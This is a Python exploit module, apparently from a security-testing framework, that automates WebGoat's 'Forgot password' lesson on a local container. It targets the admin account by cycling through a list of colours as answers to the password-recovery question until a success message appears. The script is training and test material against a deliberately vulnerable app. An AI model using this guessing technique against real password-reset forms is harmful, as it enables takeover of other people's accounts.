from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'WebGoat_AuthFlaws_ForgotPassword',
      'Description' : "'Forgot password' example from WebGoat",
      'References' :  [["EMPTY"]], 
      'Target' :      "WebGoat",
      'Container': 'ubuntu',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'Authentication Flaw'
    }


    def runExploit(self):
        goat = self.wrapper
        goat.navigate("http://guest:guest@localhost:49160/WebGoat/attack")
        goat.find_name("start").click()
        goat.implicit_wait(5)

        goat.navigate("http://localhost:49160/WebGoat/attack?Screen=28&menu=500")
        goat.find_name("Username").keys("admin")
        goat.find_name("SUBMIT").click()
      
        colors = ("blue", "yellow", "white", "purple", "red", "grey", "black", "green")
        color_is_found = False
        for color in colors:
            goat.find_name("Color").keys(color)
            goat.find_name("SUBMIT").click()
            message = goat.find("message").raw.text
            if ("Congratulations" in message):
                color_is_found = True
        self.assertTrue(color_is_found, "Unable to find the answer!")
      
